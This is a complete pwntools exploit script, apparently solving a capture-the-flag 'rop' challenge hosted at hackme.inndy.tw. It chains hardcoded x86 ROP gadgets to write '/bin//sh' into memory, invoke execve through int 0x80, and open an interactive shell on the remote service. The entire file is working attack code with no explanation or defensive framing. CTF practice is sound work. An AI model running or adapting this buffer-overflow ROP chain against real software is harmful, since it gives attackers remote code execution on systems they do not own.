#!/usr/bin/env python3
from pwn import *

context(arch='x86', terminal=['tmux', 'neww'])

# search usable gadgets from ROPgadget
mov_eax_edx = 0x0805466b
pop_eax = 0x080b8016
pop_ebx = 0x080481c9
pop_ecx = 0x080de769
pop_edx = 0x0806ecda
writable = 0x080ea060
syscall = 0x0806f42f

payload = b''
payload += b'aaaabaaacaaadaaa' # Offset

payload += p32(pop_eax)
payload += b'/bin'
payload += p32(pop_edx)
payload += p32(writable)
payload += p32(mov_eax_edx) # Move "/bin" to writable address

payload += p32(pop_eax)
payload += b'//sh'
payload += p32(pop_edx)
payload += p32(writable+4)
payload += p32(mov_eax_edx) # Move "//sh" to writable address+4

# execve(ebx, ecx, edx)
payload += p32(pop_edx) 
payload += p32(0) # edx = 0
payload += p32(pop_ebx)
payload += p32(writable) # ebx = writable address ("/bin/sh")
payload += p32(pop_ecx)
payload += p32(0) # ecx = 0

payload += p32(pop_eax)
payload += p32(0x0b) # execve = 0x0b

payload += p32(syscall) # int 0x80

#r = process('./rop')
#gdb.attach(r)
r = remote('hackme.inndy.tw', 7704)
r.sendline(payload)
r.interactive()

